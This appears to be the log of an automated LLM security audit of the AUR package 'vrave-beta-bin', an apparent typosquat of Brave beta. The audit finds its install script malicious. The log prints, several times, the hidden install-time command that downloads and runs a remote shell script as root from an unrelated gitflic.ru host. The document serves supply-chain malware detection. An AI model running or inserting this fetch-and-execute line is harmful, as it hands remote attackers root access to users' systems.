---
package: vrave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22785
completion_tokens: 4084
total_tokens: 26869
cost: 0.002816723
execution_time: 44.57
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:03:34Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore whitelisting packaging files; no malicious behavior found.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata with pinned official upstream sources and checksums. No security issues found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Safe launcher script reading local flags and executing the package binary.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: PKGBUILD
    status: safe
    summary: Legitimate binary packaging with official sources, pinned checksums, and no malicious behavior.
  - file: brave-browser.desktop
    status: safe
    summary: Benign desktop entry file; no malicious behavior found.
  - file: vrave-beta-bin.install
    status: unsafe
    summary: Install script fetches and executes remote code from an unrelated host at install time.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing vrave-beta-bin from local mirror...
Materialized vrave-beta-bin
Analyzing vrave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD only contains standard variable definitions and arrays in its global scope. No command substitutions, function calls, or any code that executes during sourcing are present. The functions `prepare()` and `package()` contain operations that could be considered potentially dangerous (tar, rm, sed, chmod 4755), but these are only executed during `makepkg` build/package phases, not during `makepkg --printsrcinfo`. Therefore, running `makepkg --printsrcinfo` on this file is safe.
</details>
<evidence></evidence>
<summary>No dangerous code in global scope.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- No dangerous code in global scope.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .gitignore...
[0/7] Reviewing .gitignore, PKGBUILD...
[0/7] Reviewing .gitignore, PKGBUILD, .SRCINFO...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard `.gitignore` for an AUR package repository. It ignores all files except those explicitly whitelisted, such as `PKGBUILD`, `.SRCINFO`, install scripts, and package assets like `brave-beta-bin.sh`, `brave-browser.desktop`, and `logo.png`. This is normal repository hygiene and does not contain any executable, network, or file-manipulation behavior. No security concerns are present.
</details>
<evidence>
</evidence>
<summary>
Standard .gitignore whitelisting packaging files; no malicious behavior found.
</summary>
</security_assessment>

[0/7] Reviewing .gitignore, PKGBUILD, .SRCINFO, brave-beta-bin.sh...
[1/7] Reviewing PKGBUILD, .SRCINFO, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore whitelisting packaging files; no malicious behavior found.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` file is standard AUR package metadata. It defines a binary package for Brave Browser Beta, downloading `.deb` releases from the official Brave GitHub repository (`github.com/brave/brave-browser`). Both architecture-specific source URLs are pinned to release `v1.98.47` and include explicit SHA-512 checksums, which is good packaging practice. The local `brave-beta-bin.sh` source also has a checksum.

There are no suspicious network destinations, no encoded or obfuscated commands, no executable payloads beyond the upstream browser package, and no indication of data exfiltration or backdoor behavior. This file is metadata only; no malicious or supply-chain attack indicators are present.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata with pinned official upstream sources and checksums. No security issues found.
</summary>
</security_assessment>

[1/7] Reviewing PKGBUILD, .SRCINFO, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata with pinned official upstream sources and checksums. No security issues found.
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard application launcher wrapper for Brave Browser Beta. It reads an optional user flags configuration file from the user&#39;s XDG config directory, strips comments, and passes those flags along with any environment-specified flags to the installed binary at `/opt/brave.com/brave-beta/brave-browser`.

There is no evidence of malicious behavior: no network requests, no obfuscation, no base64/eval usage, no file tampering, and no execution of untrusted downloaded content. Reading a local user configuration file and passing its contents as command-line arguments is normal for AUR wrapper scripts such as this. The `cat | sed` pipeline is benign. The script only executes the package&#39;s own installed binary, which is expected packaging practice.
</details>
<evidence>
</evidence>
<summary>
Safe launcher script reading local flags and executing the package binary.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop, logo.png...
[3/7] Reviewing PKGBUILD, brave-browser.desktop, logo.png...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Safe launcher script reading local flags and executing the package binary.
[3/7] Reviewing PKGBUILD, brave-browser.desktop, logo.png, vrave-beta-bin.install...
[4/7] Reviewing PKGBUILD, brave-browser.desktop, vrave-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD follows standard binary-release packaging practices. It downloads the Brave Browser beta `.deb` packages exclusively from the official Brave GitHub releases for the pinned version `1.98.47`, with explicit SHA-512 checksums for all architectures. No unexpected network downloads, no `curl | bash`, no obfuscated code, and no data exfiltration are present.

The `prepare()` and `package()` functions only extract the upstream `.deb`, remove an upstream cron directory, rewrite the desktop launcher path, copy files into `$pkgdir`, install the provided launcher script, and set the `chrome-sandbox` binary to mode `4755`. The SUID sandbox is a standard, expected component of Chromium-based browsers such as Brave; while it has security implications, it is not malicious in this context and is part of normal packaging for such applications.

The package name `vrave-beta-bin` is slightly unusual, but the sources, checksums, and packaging operations are consistent with a legitimate binary packaging of Brave beta. There is no evidence of injected malicious behavior.
</details>
<evidence>
</evidence>
<summary>
Legitimate binary packaging with official sources, pinned checksums, and no malicious behavior.
</summary>
</security_assessment>

[5/7] Reviewing brave-browser.desktop, vrave-beta-bin.install...
+ Reviewed PKGBUILD. Status: SAFE -- Legitimate binary packaging with official sources, pinned checksums, and no malicious behavior.
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard freedesktop.org .desktop launcher file for the Brave Beta web browser. It contains only metadata: application name, localized GenericName and Comment strings, startup behavior, icon, executable (`brave-beta`), MIME types, and desktop categories. There are no scripts, commands, network operations, encoded payloads, or file-manipulation logic. The `Exec=brave-beta %U` line simply launches the package's own browser binary with the URL arguments passed by the desktop environment, which is normal and expected behavior for a browser launcher.
</details>
<evidence>
</evidence>
<summary>
Benign desktop entry file; no malicious behavior found.</summary>
</security_assessment>

[6/7] Reviewing vrave-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Benign desktop entry file; no malicious behavior found.
LLM auditresponse for vrave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This install script is malicious. It contains a top-level command that downloads and immediately executes a remote shell script using the `bash &lt;(curl ...)` pattern, which is functionally equivalent to `curl | bash`. The script is fetched from an unrelated third-party host (`gitflic.ru/project/hellscripter`) through an archived web link, rather than from the package&#39;s own upstream release. Because this code sits outside any `post_install`/`post_upgrade` function and is top-level, it executes when pacman sources the install script during package installation or upgrade, running with root privileges.

This is a clear supply-chain red flag: arbitrary remote code is executed with no checksum verification, no pinned revision, and no relation to the package&#39;s legitimate build sources. The code could exfiltrate data, install backdoors, or modify the system. This is not a standard packaging practice and is genuinely malicious behavior.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Install script fetches and executes remote code from an unrelated host at install time.</summary>
</security_assessment>

Second look for vrave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The file contains a top-level, unconditional command that pipes a remote script from `https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh` directly into `bash`. This is precisely the dangerous pattern listed in the rules: downloading code from an untrusted/unexpected host and executing it. The command sits outside the harmless `post_install`/`post_upgrade` stubs, so it runs when the install script is sourced by pacman during package installation or upgrade, with root privileges. The destination host (`gitflic.ru/project/hellscripter`) is unrelated to the package&#39;s normal upstream and the fetched content is unpinned and unverified. This is injected malicious behavior in the AUR packaging, not upstream application functionality nor packaging hygiene.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Install script executes remote code from an unrelated host: UNSAFE.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed vrave-beta-bin.install. Status: UNSAFE -- Install script fetches and executes remote code from an unrelated host at install time.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## vrave-beta-bin.install

Status: UNSAFE

Summary: Install script fetches and executes remote code from an unrelated host at install time.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This install script is malicious. It contains a top-level command that downloads and immediately executes a remote shell script using the `bash <(curl ...)` pattern, which is functionally equivalent to `curl | bash`. The script is fetched from an unrelated third-party host (`gitflic.ru/project/hellscripter`) through an archived web link, rather than from the package's own upstream release. Because this code sits outside any `post_install`/`post_upgrade` function and is top-level, it executes when pacman sources the install script during package installation or upgrade, running with root privileges.

This is a clear supply-chain red flag: arbitrary remote code is executed with no checksum verification, no pinned revision, and no relation to the package's legitimate build sources. The code could exfiltrate data, install backdoors, or modify the system. This is not a standard packaging practice and is genuinely malicious behavior.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,785
  Completion Tokens: 4,084
  Total Tokens: 26,869
  Total Cost: $0.002817
  Execution Time: 44.57 seconds

Final Status: UNSAFE


Issues Found:

vrave-beta-bin.install: [UNSAFE] Install script fetches and executes remote code from an unrelated host at install time. / This install script is malicious. It contains a top-level command that downloads and immediately executes a remote shell script using the `bash <(curl ...)` pattern, which is functionally equivalent to `curl | bash`. The script is fetched from an unrelated third-party host (`gitflic.ru/project/hellscripter`) through an archived web link, rather than from the package's own upstream release. Because this code sits outside any `post_install`/`post_upgrade` function and is top-level, it executes when pacman sources the install script during package installation or upgrade, running with root privileges.

This is a clear supply-chain red flag: arbitrary remote code is executed with no checksum verification, no pinned revision, and no relation to the package's legitimate build sources. The code could exfiltrate data, install backdoors, or modify the system. This is not a standard packaging practice and is genuinely malicious behavior.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
